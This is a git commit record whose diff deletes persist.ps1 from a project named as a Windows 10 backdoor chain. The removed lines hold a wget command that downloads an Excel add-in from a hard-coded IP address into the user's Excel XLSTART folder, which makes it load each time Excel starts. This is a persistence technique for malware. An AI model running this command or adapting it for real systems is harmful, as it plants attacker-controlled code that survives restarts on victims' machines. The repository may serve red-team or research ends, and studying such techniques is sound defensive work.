1b1dbebc5c0a60dca39701d8efbdf910c89f365a
0xcc-Since2016 <0xccsince2016@gmail.com>
2019-01-24 07:01:37 -0800

    omit other's facilities

--- Win10_backdoorchain_tested_on1709/Persistence/persist.ps1
+++
@@ -1,5 +0,0 @@
-#This is a sample file.
-#Acquire specified directory.
-
-#Acquire target file
-wget 'http://192.144.143.151/sysinit.xlam' -O $env:HOMEPATH'\AppData\Roaming\Microsoft\Excel\XLSTART\sysinit.xlam'
